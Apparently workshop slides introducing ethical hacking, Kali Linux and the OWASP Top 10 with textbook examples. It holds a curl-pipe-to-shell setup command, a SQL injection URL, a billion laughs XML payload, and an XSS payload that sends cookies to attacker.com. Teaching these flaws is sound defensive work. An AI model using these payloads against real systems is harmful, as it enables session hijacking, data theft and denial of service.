## Welcome !

```shell
curl -fsSL http://<the server ip>:81/kali-setup.sh | sh
```

---

### Hacking

Hacking is unauthorized intrusion into a computer or a network. The person engaged in hacking activities is generally referred to as a hacker. This hacker may alter system or security features to accomplish a goal that differs from the original purpose of the system.

### Ethical hacking

Ethical hacking refers to the act of locating weaknesses and vulnerabilities of computer and information systems by duplicating the intent and actions of malicious hackers.

---

### Kali Linux

Kali Linux is a Debian-derived Linux distribution designed for digital forensics and penetration testing (pentest).

Kali Linux has over 600 preinstalled penetration-testing programs, including Armitage (a graphical cyber attack management tool), Nmap (a port scanner), Wireshark (a packet analyzer), John the Ripper password cracker, Aircrack-ng (a software suite for penetration-testing wireless LANs), Burp suite and OWASP ZAP web application security scanners. Kali Linux can run natively when installed on a computer's hard disk, can be booted from a live CD or live USB, or it can run within a virtual machine. It is a supported platform of the Metasploit Project's Metasploit Framework, a tool for developing and executing security exploits.

---

### Top 10

 * Injection
 * Broken Authentication
 * Sensitive Data Exposure
 * XML External Entities
 * Broken Access Control
 * Security Misconfiguration
 * Cross-site Scripting (XSS)
 * Insecure Deserialization
 * Using components with Known Vulnerabilities
 * Insufficient Logging & Monitoring

And not to forget:
 * Cross-Site Request Forgery
 * Invalidated Redirects and Forwards

---

### Injection

When we use user-supplied data in a query, command, interpreter, etc.

Vulnerabilities:

```java
String query = "SELECT * FROM accounts WHERE custID='"
    + request.getParameter("id") + "'";

Query HQLQuery = session.createQuery("FROM accounts WHERE custID='"
    + request.getParameter("id") + "'");
```

Attack:
> http://example.com/app/accountView?id='or '1'='1

---

### Broken Authentication

When we don't correctly implement authentication flow (technically and/or functionnaly).

Vulnerabilities:
 * Permits brute force, credential stuffing.
 * Permits default, well-known passwords: 'admin/admin', 'admin/admin123', etc.
 * Uses weak credential recovery/forgotten-password processes.
 * Does not properly invalidate session IDs, sessions or tokens during logout or inactivity.

---

### Sensitive Data Exposure

When we don't properly encrypt sensitive data during transit and at rest.

Vulnerabilities:
 * HTTP, SMTP, FTP.
 * Sensitive data and/or backups are stored in clear text.
 * Old or weak cryptographic algorithms are used.
 * Default cryptographic keys are used.
 * Certificates are not valid.

Attacks:
 * The password database uses simple hashes to store everyone's passwords. A file upload flaw allows attacker to retrieve the password database. The attacker uses rainbow table to get passwords.

---

### XML External Entities

When we accept XML input or XML uploads or we use user-supplied data in XML.

Attacks:
 * The attacker attempts a denial-of-service attack with a billion laughs attack:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

---

### Broken Access Control

When we don't check that a user has the privileges and control to access the requested data.

Attacks:
 * The attacker change the account URL in his/her browser to access the account of someone else:
> http://myawesomeapp.net/account/234/edit
> http://myawesomeapp.net/account/356/edit

---

### Security Misconfiguration

When we misconfigure a security component at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage.

Attacks:
 * The attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a serious access control flaw in the application.

---

### Cross-Site Scripting

When we forget to escape an untrusted source of data.

Attacks:
 * The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

```java
(String) page += "<input name='creditcard' type='TEXT' value='"
    + request.getParameter("CC") + "'>";
```

 The attacker modifies the ‘CC’ parameter in the browser to:

 ```javascript
 "><script>document.location="
    + "'http://www.attacker.com/cgi-bin/cookie.cgi"
    + "? foo='+document.cookie</script>"
 ```

 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.

---

### Insecure Deserialization

When we accept serialized objects from untrusted sources.

Attacks:
 * The attacker notice serialized java objects in request/response (R00 signature) and use JavaSerialKiller tool to execute code on the application server.

---

### Using Components with Known Vulnerabilities

There are automated tools to help attackers find unpatched or misconfigured systems. For example, the Shodan IoT search engine can help you find devices that still suffer from
the Heartbleed vulnerability (OpenSSL security bug) that was patched in April 2014.

---

### Insufficient Logging & Monitoring

Most successful attacks start with vulnerability probing. Allowing such probes to continue can raise the likelihood of successful exploit to nearly 100%.
